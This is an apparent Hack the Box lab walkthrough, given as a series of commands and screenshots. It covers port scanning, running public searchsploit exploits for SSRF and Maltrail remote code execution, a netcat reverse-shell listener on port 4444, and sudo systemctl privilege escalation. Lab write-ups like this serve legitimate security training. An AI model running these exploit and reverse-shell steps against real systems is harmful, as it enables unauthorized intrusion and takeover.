```
rustscan -a 10.10.11.224 -r 0-65535 --ulimit 5000
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/eb7f80db-8ea9-414a-9854-1341815a5d8b)

```
nmap -Pn -sC -sV -p 22,55555 10.10.11.224
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/3940691b-cf5c-4028-99fe-e2e498ce1d8e)

HTTP 55555
```
http://10.10.11.224:55555/web
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d765624b-9fbf-476d-9ef9-ffbced68b099)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/79f69a5d-4089-415f-a730-95af922adc0a)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/90cf2208-534e-48e8-ac26-f19e52370a7d)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/e3295c04-4b3e-47ca-9d22-bbcb09054e93)

Search Exploits
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/133c49dc-5684-4ead-ab67-a918ada9b649)

Download Exploit
```CSS
searchsploit -m python/webapps/51675.sh
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/22c3d009-796c-4673-b744-f4fc250d2903)

Run Exploit
```CSS
/51675.sh http://10.10.11.224:55555/ http://127.0.0.1:80/
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/21037b3a-2ebd-4701-97e3-716eab11b387)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5a3aa473-763c-4074-b1d5-82b081f3226f)

Search Exploits
```CSS
searchsploit maltrail
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4925095c-7d81-4c89-bfbc-b1a32a2c2a6c)

Download Exploit
```CSS
searchsploit -m python/webapps/51676.py
```

Start Netcat Listener
```CSS
rlwrap nc -nlvvp 4444
```

Run Exploit
```
python3 51676.py 10.10.14.4 4444 http://10.10.11.224:55555/nmsxly
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d1f9fe95-40a3-4694-a9ef-ebf126e09f4f)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/3dde2cda-02a1-4206-92ef-1ee52146c66d)

Privilege Escalation
```CSS
sudo -l
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d5572bae-5d90-44bc-94bf-05e1dde27be4)

```CSS
sudo systemctl status trail.service
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d787cd01-cd77-43ca-834e-42ba5f899c29)

Reference: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/e56fc35b-43e5-4a91-b509-4b488c90f000)

![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4d9a0eb9-77f7-4635-b78b-65c9643f2f83)
